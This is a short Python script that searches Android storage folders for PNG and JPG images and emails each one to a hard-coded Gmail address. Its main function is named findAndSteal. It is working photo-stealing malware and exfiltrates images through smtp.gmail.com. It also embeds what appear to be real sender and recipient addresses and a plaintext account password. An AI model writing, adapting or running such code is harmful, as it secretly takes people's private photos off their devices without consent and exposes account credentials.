import os
import smtplib
import email
import email.mime.application as mime
from email.mime.multipart import MIMEMultipart

path1 = r'/storage/'
path2 = r'/sdcard/'

extensions_ = ['.png', '.jpg']


def send_file(dirPath, x):
    email_sender = 'tdistroer@gmail.com'
    email_getter = 'csgonly2006@gmail.com'
    password = 'distroer123'

    msg = MIMEMultipart()
    msg['Subject'] = 'File'
    msg['From'] = email_sender
    msg['To'] = email_getter
    filename = dirPath + "\\" + x
    fp = open(filename, 'rb')
    att = email.mime.application.MIMEApplication(fp.read(), _subtype="png")
    fp.close()

    att.add_header('Content-Disposition', 'attachment', filename=filename)
    msg.attach(att)
    smpt_server = smtplib.SMTP('smtp.gmail.com', 587)

    smpt_server.starttls()

    smpt_server.login(email_sender, password)
    smpt_server.sendmail(email_sender, email_getter, msg.as_string())


def findAndSteal(pathWhereSearch, extension_):
    for dirPath, dirNames, fileNames in os.walk(pathWhereSearch):
        for x in fileNames:
            tupleFile = os.path.splitext(x)
            if tupleFile[-1] == extension_[0] or tupleFile[-1] == extension_[1]:
                print('Current Path: ' + dirPath + "\\" + x)
                print('Files: ' + x)
                print()
                send_file(dirPath, x)


findAndSteal(path2, extensions_)
findAndSteal(path1, extensions_)



